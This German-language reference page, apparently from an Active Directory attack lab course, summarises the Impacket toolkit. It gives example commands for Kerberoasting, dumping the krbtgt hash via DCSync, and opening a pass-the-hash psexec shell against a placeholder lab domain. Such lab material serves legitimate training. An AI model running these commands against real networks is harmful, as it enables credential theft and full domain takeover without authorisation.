# Impacket

**Kategorie:** AD-/Windows-Angriffe (Python-Toolsammlung)

Sammlung von Python-Skripten für Windows-/AD-Protokolle (SMB, MSRPC, Kerberos, LDAP, DRSUAPI). Das Arbeitstier für AD-Angriffe von Kali aus – Remote-Execution, Credential-Dumping, Kerberos-Angriffe.

```bash
<tool>.py <domain>/<user>:<pass>@<ziel> [Optionen]
# oder mit Hash:  -hashes :<NT>   |  Kerberos:  -k -no-pass
```

## Wichtigste Tools

| Tool | Zweck |
|------|-------|
| `GetNPUsers.py` | AS-REP Roasting (Accounts ohne Preauth) |
| `GetUserSPNs.py` | Kerberoasting (`-request`) |
| `secretsdump.py` | SAM/LSA/NTDS dumpen, **DCSync** (`-just-dc`) |
| `psexec.py` / `wmiexec.py` / `smbexec.py` | Remote-Shell über SMB |
| `ticketer.py` | Golden/Silver Ticket |
| `GetADUsers.py` / `lookupsid.py` | User-/SID-Enum |
| `ntlmrelayx.py` | NTLM-Relay (Übung 07) |

## Beispiele

```bash
GetUserSPNs.py lab.local/user:'pw' -dc-ip <DC> -request
secretsdump.py lab.local/da:'pw'@<DC> -just-dc-user krbtgt
psexec.py -hashes :<NT> lab.local/Administrator@<ZIEL>
```

## Hinweis

Authentifizierung per Passwort (`user:pass`), **Hash** (`-hashes LM:NT`, PtH) oder **Kerberos** (`-k -no-pass`, mit `KRB5CCNAME`). Clock-Skew vermeiden (Zeit sync). Nur eigenes AD-Lab. Installation: `sudo apt install impacket-scripts` / `pipx install impacket`.

## Verwendet in

active-directory-attacks 02, 05, 06, 07, 08, 09, 10.
